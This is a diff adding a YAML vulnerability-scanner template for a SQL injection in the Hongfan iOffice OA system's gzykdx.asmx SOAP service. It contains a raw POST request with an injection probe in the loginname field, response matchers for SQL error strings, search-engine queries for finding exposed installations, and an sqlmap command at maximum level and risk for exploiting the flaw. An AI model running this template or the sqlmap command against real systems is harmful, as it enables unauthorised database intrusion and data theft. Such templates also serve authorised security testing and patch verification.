@@ -1,0 +1,49 @@
+id: hongfan-ioffice-gzykdx-sqli
+info:
+  name: hongfan ioffice gzykdx.asmx - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-hongfan-ioffice-gzykdx.asmx-sqli.yml
+  metadata:
+    verified: true
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    tips:
+    repair:
+    sqlmap: qlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mssql
+  tags: hongfan,sqli,oa,ioffice
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/interface/gzykdx.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/xml; charset=utf-8 
+        SOAPAction: http://tempuri.org/getMhUser
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?> 
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> 
+         <soap:Body> 
+         <getMhUser xmlns="http://tempuri.org/"> 
+         <loginname>*'</loginname> 
+        <userName>string</userName> 
+        <depNo>string</depNo> 
+        <depName>string</depName> 
+        </getMhUser> 
+        </soap:Body> 
+        </soap:Envelope>   
+   
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'SqlException','语法错误')
+        condition: and
